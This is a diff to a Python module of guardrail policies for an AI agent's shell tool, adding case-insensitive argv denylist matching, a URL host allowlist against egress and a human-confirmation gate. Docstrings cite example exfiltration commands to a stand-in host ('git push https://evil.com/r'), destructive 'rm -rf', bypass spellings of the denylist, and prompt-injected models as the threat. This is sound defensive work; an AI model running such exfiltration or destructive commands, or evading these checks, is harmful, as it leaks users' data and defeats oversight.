@@ -10,11 +10,13 @@ Allow-by-default — an empty Warden imposes no constraints.
 
 This module ships four starter policies:
 
-  AllowlistPolicy        — restrict a tool's input to a set of values
-  CommandAllowlistPolicy — argv[0]-basename allowlist for run_command
-  CostCeilingPolicy      — deny tools once daily USD spend exceeds budget
-  QuietHoursPolicy       — deny tools during a local-time window
-  ArgvValidatorPolicy    — deny argv patterns for run_command
+  AllowlistPolicy          — restrict a tool's input to a set of values
+  CommandAllowlistPolicy   — argv[0]-basename allowlist for run_command
+  CostCeilingPolicy        — deny tools once daily USD spend exceeds budget
+  QuietHoursPolicy         — deny tools during a local-time window
+  ArgvValidatorPolicy      — deny argv patterns for run_command
+  UrlAllowlistPolicy       — deny egress to non-allowlisted hosts in argv
+  RequireConfirmationPolicy — gate egress/sensitive actions on human approval
 
 The starter set is opinionated for personal-AI use. Custom policies just
 need to satisfy the Policy protocol.
@@ -22,6 +24,7 @@ need to satisfy the Policy protocol.
 
 from __future__ import annotations
 
+import re
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
@@ -175,13 +178,27 @@ class CommandAllowlistPolicy:
         )
 
 
+def _is_subsequence(needle: list[str], hay: list[str]) -> bool:
+    """True if every token of `needle` appears in `hay` in order (gaps allowed)."""
+    if not needle:
+        return False
+    it = iter(hay)
+    return all(tok in it for tok in needle)
+
+
 @dataclass
 class ArgvValidatorPolicy:
     """Forbid specific argv patterns for run_command-shaped tools.
 
-    Matches each forbidden pattern as a substring against the space-joined
-    argv. Coarse but pragmatic; use this to lock out the truly dangerous
-    invocations (e.g. `git push --force`, `rm -rf`).
+    A pattern matches if EITHER:
+      - it appears as a substring of the space-joined argv, OR
+      - its whitespace-split tokens appear as an ordered subsequence of the
+        argv tokens (so `git --no-pager push --force` still trips
+        "git push --force", and extra whitespace can't evade it).
+
+    Matching is case-insensitive. Still a denylist — coarse and bypassable by
+    equivalent spellings (`rm -fr`, `find -delete`); pair it with the argv[0]
+    allowlist (the real gate) and UrlAllowlistPolicy for egress.
     """
 
     forbid: list[str]
@@ -194,14 +211,115 @@ class ArgvValidatorPolicy:
         argv = ctx.tool_input.get("argv")
         if not isinstance(argv, list):
             return PolicyDecision("allow", policy_name=self.name)
-        joined = " ".join(str(a) for a in argv)
+        tokens = [str(a).lower() for a in argv]
+        joined = " ".join(tokens)
         for pattern in self.forbid:
-            if pattern in joined:
+            pat = pattern.lower()
+            if pat in joined or _is_subsequence(pat.split(), tokens):
                 return PolicyDecision(
                     "deny",
                     reason=f"argv contains forbidden pattern: {pattern!r}",
                     policy_name=self.name,
                 )
+        return PolicyDecision("allow", policy_name=self.name)
+
+
+# URL host extraction: scheme://[user@]host[:port]/… and scp-style user@host:path.
+_URL_HOST_RE = re.compile(r"[a-zA-Z][a-zA-Z0-9+.\-]*://(?:[^/@\s]+@)?([^/:\s]+)")
+_SCP_HOST_RE = re.compile(r"(?:^|[\s])[\w.\-]+@([\w.\-]+):")
+
+
+def _extract_hosts(text: str) -> set[str]:
+    hosts = {m.group(1).lower() for m in _URL_HOST_RE.finditer(text)}
+    hosts |= {m.group(1).lower() for m in _SCP_HOST_RE.finditer(text)}
+    return hosts
+
+
+@dataclass
+class UrlAllowlistPolicy:
+    """Restrict outbound URLs/remotes in run_command argv to allowed hosts.
+
+    Scans every argv token for URL-like or scp-like targets (e.g.
+    `git push https://evil.com/r`, `git remote add x git@evil.com:r`). Any
+    host that is not an allowed host (or a subdomain of one) trips the policy.
+    Defaults to a hard `deny` — pushing to an arbitrary host is essentially
+    never a legitimate request and is the classic injection exfil channel.
+
+    A subdomain of an allowed host is allowed (gist.github.com ⊂ github.com).
+    """
+
+    allowed_hosts: set[str]
+    tool_name: str = "run_command"
+    verdict_on_block: Verdict = "deny"
+    name: str = "url_allowlist"
+
+    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
+        if ctx.tool_name != self.tool_name:
+            return PolicyDecision("allow", policy_name=self.name)
+        argv = ctx.tool_input.get("argv")
+        if not isinstance(argv, list):
+            return PolicyDecision("allow", policy_name=self.name)
+        hosts: set[str] = set()
+        for tok in argv:
+            hosts |= _extract_hosts(str(tok))
+        blocked = sorted(h for h in hosts if not self._allowed(h))
+        if blocked:
+            return PolicyDecision(
+                self.verdict_on_block,
+                reason=f"egress to non-allowlisted host(s): {blocked}",
+                policy_name=self.name,
+            )
+        return PolicyDecision("allow", policy_name=self.name)
+
+    def _allowed(self, host: str) -> bool:
+        host = host.lower()
+        return any(
+            host == a.lower() or host.endswith("." + a.lower())
+            for a in self.allowed_hosts
+        )
+
+
+@dataclass
+class RequireConfirmationPolicy:
+    """Force human confirmation for sensitive / egress actions.
+
+    Returns ``require_confirmation`` (not ``deny``) so an interactive
+    confirmer can approve the call. Crucially, the agent loop fails closed:
+    if no confirmer is wired (e.g. a headless daemon), an unconfirmed call is
+    declined, not executed. This is the structural cap on injection blast
+    radius — a hijacked model still can't exfiltrate or act outbound without
+    passing this gate.
+
+    Two match modes (either triggers):
+      - ``tools``: confirm any call to these tool names outright (e.g. an
+        email/Telegram send tool, an MCP write tool).
+      - ``argv_patterns``: confirm a run_command-shaped call whose space-joined
+        argv contains any of these substrings (e.g. "git push").
+    """
+
+    tools: set[str] = field(default_factory=set)
+    argv_patterns: list[str] = field(default_factory=list)
+    command_tool: str = "run_command"
+    name: str = "require_confirmation"
+
+    async def evaluate(self, ctx: PolicyContext) -> PolicyDecision:
+        if ctx.tool_name in self.tools:
+            return PolicyDecision(
+                "require_confirmation",
+                reason=f"'{ctx.tool_name}' is a sensitive action",
+                policy_name=self.name,
+            )
+        if ctx.tool_name == self.command_tool and self.argv_patterns:
+            argv = ctx.tool_input.get("argv")
+            if isinstance(argv, list):
+                joined = " ".join(str(a) for a in argv)
+                for pattern in self.argv_patterns:
+                    if pattern in joined:
+                        return PolicyDecision(
+                            "require_confirmation",
+                            reason=f"egress: argv contains {pattern!r}",
+                            policy_name=self.name,
+                        )
         return PolicyDecision("allow", policy_name=self.name)
 
 
